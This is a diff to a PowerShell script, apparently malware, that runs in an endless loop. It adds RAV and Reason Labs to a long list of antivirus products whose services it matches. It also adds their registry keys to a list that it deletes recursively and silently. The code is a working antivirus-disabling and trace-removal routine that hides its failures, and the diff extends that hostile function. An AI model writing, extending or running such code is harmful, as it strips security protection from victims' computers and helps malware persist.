@@ -360,7 +360,7 @@ while ($true) {
                 '*360*', '*Qihu*', '*ZhuDong*', '*AVG*', '*Avast*', '*Smadav*', '*McAfee*', '*Norton*', '*Symantec*',
                 '*Bitdefender*', '*ESET*', '*ekrn*', '*Malwarebytes*', '*MBAM*', '*Avira*', '*Sophos*', '*TrendMicro*',
                 '*Webroot*', '*WRSA*', '*Panda*', '*Baidu*', '*PCMatic*', '*BullGuard*', '*F-Secure*', '*Cylance*',
-                '*SentinelOne*', '*TotalAV*', '*K7AntiVirus*'
+                '*SentinelOne*', '*TotalAV*', '*K7AntiVirus*', '*RAV*', '*Reason*'
             )
             Get-Service | Where-Object { 
                 $name = $_.Name; $disp = $_.DisplayName
@@ -400,7 +400,10 @@ while ($true) {
                 "HKLM:\SOFTWARE\F-Secure", "HKLM:\SOFTWARE\WOW6432Node\F-Secure",
                 "HKLM:\SOFTWARE\Cylance", "HKLM:\SOFTWARE\WOW6432Node\Cylance",
                 "HKLM:\SOFTWARE\SentinelOne", "HKLM:\SOFTWARE\WOW6432Node\SentinelOne",
-                "HKLM:\SOFTWARE\TotalAV", "HKLM:\SOFTWARE\WOW6432Node\TotalAV"
+                "HKLM:\SOFTWARE\TotalAV", "HKLM:\SOFTWARE\WOW6432Node\TotalAV",
+                "HKLM:\SOFTWARE\RAV", "HKLM:\SOFTWARE\WOW6432Node\RAV",
+                "HKLM:\SOFTWARE\Reason Labs", "HKLM:\SOFTWARE\WOW6432Node\Reason Labs",
+                "HKLM:\SOFTWARE\Reason Cybersecurity", "HKLM:\SOFTWARE\WOW6432Node\Reason Cybersecurity"
             )
             foreach ($rPath in $oldAvRegs) {
                 if (Test-Path $rPath) { Remove-Item -Path $rPath -Recurse -Force -ErrorAction SilentlyContinue }
